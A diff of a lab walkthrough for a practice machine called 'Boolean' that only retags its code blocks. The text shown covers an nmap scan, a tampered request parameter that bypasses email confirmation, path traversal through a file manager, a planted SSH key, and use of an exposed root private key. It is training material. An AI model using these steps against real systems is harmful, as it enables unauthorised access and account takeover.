@@ -3,7 +3,7 @@
 # 🐧Boolean🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.156.231
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 13:47 AEDT
 Nmap scan report for 192.168.156.231
@@ -19,7 +19,7 @@ There is a web login page
 We create a user and login as user  
 Then click resend email  
 Use burpsuite to change the payload
-```
+```console
 Add this to the payload  -   &user%5Bconfirmed%5D=True
 
 
@@ -28,26 +28,26 @@ _method=patch&authenticity_token=_QlOu-myYsI4qa-ASLIILonpLq6osynvu13Pmk0nln3kFf2
 Then we can successfully logged in to the file manager  
 We can upload and download files  
 the URL will change if we download a file
-```
+```console
 http://192.168.156.231/?cwd=&file=47631.txt&download=true
 ```
 The cwd probably is the current working directory  
 We try to change it and it shows all files in home directory
-```
+```console
 http://192.168.156.231/?cwd=../../../../../../../../home
 remi
 ```
 There is a remi user  
 and we can access the .ssh directory  
 Since the authorized_keys is missing and we can upload file, we will generate the key ourself and upload it
-```
+```console
 ssh-keygen -q -N '' -f sshkey
 mv sshkey.pub authorized_keys
 chmod 600 sshkey
 ```
 upload the authorized_keys to the .ssh directory
 the we can login as remi via ssh using the sshkey we created
-```
+```console
 $ ssh remi@192.168.156.231 -i sshkey
 Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
 remi@boolean:~/.ssh/keys$ id
@@ -55,7 +55,7 @@ uid=1000(remi) gid=1000(remi) groups=1000(remi)
 ```
 ## Privilege Escalation
 Since remi can access the keys, there is a root key in the directory
-```
+```console
 remi@boolean:~/.ssh/keys$ ls
 id_rsa  id_rsa.1  id_rsa.2  root
 remi@boolean:~/.ssh/keys$ cat root
@@ -88,7 +88,7 @@ ZiFQwJfGHaM8C7EAAAAMcmVtaUBib29sZWFuAQIDBAUGBw==
 -----END OPENSSH PRIVATE KEY-----
 ```
 We will try to login local using the private to root 
-```
+```console
 remi@boolean:~/.ssh/keys$ ssh -o IdentitiesOnly=yes -i /home/remi/.ssh/keys/root root@127.0.0.1
 Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
 
